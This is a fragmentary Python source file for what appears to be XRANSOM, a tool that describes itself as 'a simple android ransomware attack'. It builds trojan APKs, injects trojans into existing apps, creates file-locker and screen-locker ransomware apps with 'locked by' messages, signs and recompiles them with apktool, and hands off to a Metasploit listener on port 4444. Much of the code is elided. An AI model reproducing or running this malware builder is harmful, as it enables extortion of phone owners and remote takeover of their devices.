...
def genertare_screen_locker(name, head, desc, keys, icon):
    ...
    text = f'{ARXU} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
            with Image.open(line) as f:
...
def start_trojan_listener(host, port):
    prints(f'''
{ARXU} : redirecting to the metasploit console
...
def uber_apk_signer(file):
    text = f'{ARXU} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
    print(text + f'{y}wait{w}', end='\r')
...
def decompile(file):
    text = f'{ARXU} : decompile \'{d}{file}{w}\' using apktool ... '
...
def recompile(path):
    text = f'{ARXU} : recompile \'{d}{path}{w}\' using apktool ... '
    file = path + '.apk'
    print(text + f'{y}wait{w}', end='\r')
...
class __ARXU__:
    ...
    def custom_trojan(self):
        banner()
        prints(f'''
{ARXU} : you can fill or leave blank for using
        ...
        prints(f'''
{ARXU} : well this process takes a few minutes,
        ...
        upload_file(apps)
        if not os.path.isfile(apps): exit(f'\n{ARXU} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
        prints(f'''
{ARXU} : your trojan apps successfully created
        ...
        else: exit(f'\n{ARXU} : process completed successfully ...\n')
        start_trojan_listener(host, port)

    def infect_trojan(self):
        banner()
        prints(f'''
{ARXU} : you can fill or leave blank for using default config
        ...
        if not os.path.isfile(orig): exit(f'{ARXU} : file \'{d}{orig}{w}\' doesn\'t exist !')
        host = str(input(f'         set app host: '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port: '))
        if not port: port = '4444'
...
{ARXU} : well this process takes a few minutes,
        ...
        upload_file(file)
        if not os.path.isfile(file): exit(f'\n{ARXU} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{ARXU} : your trojan apps successfully created
...
{ARXU} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{ARXU} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{ARXU} : your file locker apps successfully created
...
{ARXU} : you can fill or leave blank for using default config
         ...
         desc = \'{r}locked by ARXU@XRAnSom-id{w}\'
        ...
        desc = str(input(f'         set app desc: '))
        if not desc: desc = 'locked by ĀRXŪ@xransom'
        icon = str(input(f'         set app icon: '))
        if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
...
{ARXU} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{ARXU} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{ARXU} : your screen locker apps successfully created
         the application is saved as \'{g}{file}{w}\'
    ...
    def menu(self):
        banner()
        prints(f'''
{ARXU} : Hi user, welcome to @{y}ARXU{w} :)

{ARXU} : XRANSOM is a simple android ransomware attack
